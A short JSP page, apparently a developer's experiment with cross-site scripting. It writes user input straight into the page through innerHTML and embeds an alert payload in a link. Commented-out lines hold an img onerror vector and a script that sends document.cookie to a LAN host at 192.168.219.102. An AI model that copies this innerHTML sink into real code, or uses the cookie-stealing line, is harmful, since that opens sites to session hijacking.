    <%--
  Created by IntelliJ IDEA.
  User: leedonghun
  Date: 2020/09/30
  Time: 5:37 오후
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>

<body>

        <p><input type="text" id="name"></p>
<%--        <p><input type="file" name="file">(2MB를 넘을 수 없음)</p>--%>
        <p><button onclick="aa()">버튼</button></p>

        <p id="body-text">
<%--            <script>alert("123123")</script>--%>
        </p>
<%--    img 테그를 사용해 자바스크립트 실행 방법--%>
<%--<img src="#" onerror="alert('a  ')"/>--%>

        <a href="../action/fileDownload.jsp?fileName=20201113005051_-1250624752_">
            asdasda_<script>alert(1)</script>sdasdd
        </a>



    <script>
        // url = 'http://192.168.219.102:3000/test/?cookie='+document.cookie;
        // var xmlHttp = new XMLHttpRequest();
        // xmlHttp.open('GET',url,true);
        // xmlHttp.send('null')


        <%--alert('<%= (String) session.getId() %>');--%>


    </script>




</body>
<script>

    function aa(){
        let text = document.getElementById('name').value;
        document.getElementById('body-text').innerHTML = text;


    }
</script>

</html>
